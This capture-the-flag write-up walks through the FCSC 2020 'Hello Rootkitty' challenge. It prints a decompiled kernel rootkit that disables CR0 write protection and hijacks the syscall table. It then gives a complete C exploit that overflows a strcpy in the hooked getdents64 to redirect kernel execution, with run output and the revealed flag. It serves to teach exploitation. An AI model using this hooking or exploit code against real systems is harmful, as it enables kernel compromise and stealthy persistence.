# FCSC 2020 PWN: medium - Hello Rootkitty

### A machine has been infected with the rootkit Hello Rootkitty, which prevents certain files from being read. Your mission is to help the victim recover the content of the affected files. Once you are connected to SSH (credentials: ctf:ctf), run ./wrapper to start the challenge.

In this challenge we are provided with a linux kernel module named `ecsc.ko` which acts as a rootkit. We are also given a host machine we can connect through ssh containing a vm which runs the kernel module, a shared folder between the vm and the host exists.
By reverse engineering the provided module we come across these functions: 

- ecsc_start (init_module)
- ecsc_sys_getdents64
- ecsc_sys_getdents *(we will ignore this)*
- ecsc_sys_lstat
- cleanup_module

`ecsc_start`:
Its the entry point of the rootkit, here the write protection flag of the `cr0` register is disabled and the syscall table is hijacked
and the original syscalls (ref_sys_getdents64, ref_sys_getdents, ref_sys_lstat) are replaced by the rootkit's custom, malicious syscalls
```
// Alternative name is 'ecsc_start'
__int64 init_module()
{
  _QWORD *v0; // rax
  unsigned __int64 v1; // rdx
  __int64 (__fastcall *v2)(_QWORD); // rcx
  __int64 v3; // rcx
  __int64 v4; // rcx

  v0 = (_QWORD *)kallsyms_lookup_name("sys_call_table");
  my_sys_call_table = (__int64)v0;
  v1 = __readcr0();
  original_cr0 = v1;
  __writecr0(v1 & 0xFFFFFFFFFFFEFFFFLL);
  v2 = (__int64 (__fastcall *)(_QWORD))v0[217];
  v0[217] = ecsc_sys_getdents64;
  ref_sys_getdents64 = v2;
  v3 = v0[78];
  v0[78] = ecsc_sys_getdents;
  ref_sys_getdents = v3;
  v4 = v0[6];
  v0[6] = ecsc_sys_lstat;
  ref_sys_lstat = v4;
  __writecr0(v1);
  return 0;
}
```
### - what does getdents64 do?
getdents64 is the syscall that shows us the files/folders/symlinks etc when we type `ls`, `find` or when we use a graphical file explorer to see what is in our current directory, the rootkit replaces it with `ecsc_sys_getdents64` which looks for the flag file which starts with `ecsc_flag_` and masks the rest of the file name with X's, example:
```
ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde2116676126
is converted to:
ecsc_flag_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
this way, we don't know the name of the flag file to actually read it and get the flag
```
/ $ ls -la
total 4
drwxr-xr-x   14 root     root             0 Jul 10 16:12 .
drwxr-xr-x   14 root     root             0 Jul 10 16:12 ..
drwxr-xr-x    2 root     root             0 Feb 25  2020 bin
drwxr-xr-x    3 root     root             0 Jul 10 16:12 dev
-r--------    0 root     root             0 Jan  0  1900 ecsc_flag_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
drwxr-xr-x    2 root     root             0 Jul 10 16:12 etc
drwxr-xr-x    3 root     root             0 Feb 25  2020 home
----------    1 root     root          2085 Feb 25  2020 init
drwxr-xr-x    3 root     root             0 Feb 25  2020 lib
drwxr-xr-x    3 root     root             0 Jul 10 16:12 mnt
dr-xr-xr-x   28 root     root             0 Jul 10 16:12 proc
drwx------    2 root     root             0 Feb 14  2020 root
drwxr-xr-x    2 root     root             0 Jul 10 16:12 run
dr-xr-xr-x   10 root     root             0 Jul 10 16:12 sys
drwxr-xr-x    2 root     root             0 Jul 10 16:12 tmp
drwxr-xr-x    3 root     root             0 Jul 10 16:12 var
```


### - What does lstat do?
It is responsible for handing us over file metadata when we request it (usually through `ls -la`), it retrieves that metadata through the `stat` struct. The rootkit modified this metadata through `ecsc_sys_lstat` to prevent the cheesing of the challenge through tricks like `cat ecsc_flag_*` 

## - The vulnerability
Inside the `ecsc_sys_getdents64` function strcpy is used to copy our file name into a buffer, we can control the file name by making a secondary, dummy flag file which starts with 'ecsc_flag_' there is no bounds check on how big the file name can be:
```
strcpy(dest, (const char *)(a2 + 19));
```
here the second argument is the file name in the directory and the first argument is the destination buffer, just like that we can get `RIP` control by creating a file with a large file name which starts with `ecsc_flag_` and return wherever we want. But what can we do with this?

Inside the kernel module there is also a cleanup function named `cleanup_module` where every syscall that got hijacked is restored back to the original and the `cr0` register write protection flag is turned on again, this is the key to revealing the flag file name

## - Exploitation
We start by looking into `/proc/kallsyms` to peek at the addresses of `cleanup_module` and `sys_exit` so we can return to the cleanup module and then sys_exit to kill the current process so we dont crash, *note that KASLR is on for this challenge so we need to dynamically parse the addresses*, through testing we conclude that the offset to `RIP` is 102

We construct the solve script in C *(python is not installed in the vm)* which dynamically searches for `cleanup_module` and `sys_exit` addresses, builds the malicious file (file name payload) and executes it

`solve.c`
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <endian.h>
#include <stdint.h>

uint64_t get_addr(char *target) {

    FILE *kallsyms = fopen("/proc/kallsyms", "r");
    if (!kallsyms) {
        printf("-- failed to open kallsyms\n");
        return 0;
    }

    uint64_t addr;
    char type;
    char name[256];
    char line[256];

    printf("-- searching for functions\n");

    while (fgets(line, sizeof(line), kallsyms)) {
        if (sscanf(line, "%lx %c %255s", &addr, &type, name) >= 3) {
            if (strcmp(target, name) == 0) {
                fclose(kallsyms);
                return addr;
            }
        }
    }

    fclose(kallsyms);
    printf("-- address of %s not found\n", target);
    return 0;
}

int main() {

  FILE *f;
  char filename[256];
  char buf[256];

  printf("-- starting exploit\n");
  uint64_t cleanup_module = get_addr("cleanup_module");
  printf("-- cleanup_module addr: 0x%lx\n", cleanup_module);
  uint64_t sys_exit = get_addr("sys_exit");
  printf("-- sys_exit addr: 0x%lx\n", sys_exit);

  memset(filename, 0, sizeof(filename));

  printf("-- constructing payload\n");
  strcpy(filename, "ecsc_flag_");
  size_t offset = strlen(filename);

  memset(filename + offset, 0x41, 102);
  offset += 102;

  memcpy(filename + offset, &cleanup_module, sizeof(uint64_t));
  offset += sizeof(uint64_t);

  memcpy(filename + offset, &sys_exit, sizeof(uint64_t));
  offset += sizeof(uint64_t);

  printf("-- creating malicious file\n");
  f = fopen(filename, "w");
  fclose(f);

  printf("-- triggering vuln\n");
  int dirfd = open(".", O_RDONLY);
  syscall(SYS_getdents, dirfd, buf, sizeof(buf));

  return 0;

}
```
```
/ $ cd /mnt/share
/mnt/share $ ls
solve
/mnt/share $ ./solve
-- starting exploit
-- searching for function: cleanup_module
-- cleanup_module addr: 0xffffffffc02d136e
-- searching for function: sys_exit
-- sys_exit addr: 0xffffffff87a3a390
-- constructing payload
-- creating malicious file
-- triggering vuln
/mnt/share $ ls
ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn?-?????????
solve
/mnt/share $ cd /
/ $ ls -la
total 8
drwxr-xr-x   14 root     root             0 Jul 10 16:56 .
drwxr-xr-x   14 root     root             0 Jul 10 16:56 ..
drwxr-xr-x    2 root     root             0 Feb 25  2020 bin
drwxr-xr-x    3 root     root             0 Jul 10 16:56 dev
-r--r--r--    1 root     root            71 Jul 10 16:56 ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde2116676126
drwxr-xr-x    2 root     root             0 Jul 10 16:56 etc
drwxr-xr-x    3 root     root             0 Feb 25  2020 home
----------    1 root     root          2085 Feb 25  2020 init
drwxr-xr-x    3 root     root             0 Feb 25  2020 lib
drwxr-xr-x    3 root     root             0 Jul 10 16:56 mnt
dr-xr-xr-x   28 root     root             0 Jul 10 16:56 proc
drwx------    2 root     root             0 Feb 14  2020 root
drwxr-xr-x    2 root     root             0 Jul 10 16:56 run
dr-xr-xr-x   10 root     root             0 Jul 10 16:56 sys
drwxr-xr-x    2 root     root             0 Jul 10 16:56 tmp
drwxr-xr-x    3 root     root             0 Jul 10 16:56 var
/ $ cat ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde21166761
26
```





